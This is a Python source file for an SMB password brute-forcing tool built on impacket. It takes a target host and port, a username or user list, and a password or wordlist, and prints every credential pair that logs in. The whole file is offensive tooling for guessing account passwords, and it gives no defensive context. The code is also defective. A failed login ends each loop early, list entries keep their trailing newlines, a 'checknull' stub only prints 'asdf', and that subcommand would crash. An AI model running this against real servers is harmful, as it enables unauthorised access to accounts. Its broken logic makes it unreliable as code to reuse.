import argparse
from impacket.smbconnection import SMBConnection, SessionError


class SmbBruteForcer(object):
    def __init__(self, host, port, username='', userlist=None, password='', wordlist=None):
        self.session = SMBConnection(remoteHost=host, remoteName=host, sess_port=port)
        self.username = username
        self.userlist = userlist
        self.password = password
        self.wordlist = wordlist

        try:
            if self.userlist is not None:
                self.userlist = open(self.userlist, 'r')
            if wordlist is not None:
                self.wordlist = open(self.wordlist, 'r')
        except Exception as e:
            print(str(e))

    def bf_user_pass(self):
        try:
            if self.session.login(self.username, self.password):
                print(f'{self.username}:{self.password}')
        except SessionError:
            pass
        except Exception as e:
            print(str(e))

    def bf_userlist_pass(self):
        try:
            for user in self.userlist:
                if self.session.login(user, self.password):
                    print(f'{user}:{self.password}')
        except SessionError:
            pass
        except Exception as e:
            print(str(e))
        finally:
            self.userlist.close()

    def bf_user_wordlist(self):
        try:
            for word in self.wordlist:
                if self.session.login(self.username, word):
                    print(f'{self.username}:{word}')
        except SessionError:
            pass
        except Exception as e:
            print(str(e))
        finally:
            self.wordlist.close()

    def bf_userlist_passlist(self):
        try:
            for user in self.userlist:
                for word in self.wordlist:
                    if self.session.login(user, word):
                        print(f'{user}:{word}')
        except SessionError:
            pass
        except Exception as e:
            print(str(e))
        finally:
            self.userlist.close()
            self.wordlist.close()

    def check_null(self):
        try:
            print('asdf')
        except Exception as e:
            print(str(e))


parser = argparse.ArgumentParser()
subparser = parser.add_subparsers(help='')
parser.add_argument('-H', '--host', help='host of the target smb server', required=True)
parser.add_argument('-P', '--port', help='port of the target smb server', required=True)

brute_parser = subparser.add_parser('brute')
group_user = brute_parser.add_mutually_exclusive_group(required=True)
group_pass = brute_parser.add_mutually_exclusive_group(required=True)
group_user.add_argument('-u', '--username', help='username to brute force')
group_user.add_argument('-U', '--userlist', help='user list to brute force')
group_pass.add_argument('-p', '--password', help='password to use')
group_pass.add_argument('-w', '--wordlist', help='wordlist to use')

checknull_parser = subparser.add_parser('checknull')
group_null = checknull_parser.add_mutually_exclusive_group(required=False)
checknull_parser.add_argument('-s', '--share', help='share to check')
checknull_parser.add_argument('-S', '--shares', help='shares to check')


args = parser.parse_args()
brute_forcer = SmbBruteForcer(args.host, args.port, username=args.username, password=args.password, userlist=args.userlist, wordlist=args.wordlist)


if args.username and args.password:
    brute_forcer.bf_user_pass()
elif args.userlist and args.password:
    brute_forcer.bf_userlist_pass()
elif args.username and args.wordlist:
    brute_forcer.bf_user_wordlist()
elif args.userlist and args.wordlist:
    brute_forcer.bf_userlist_passlist()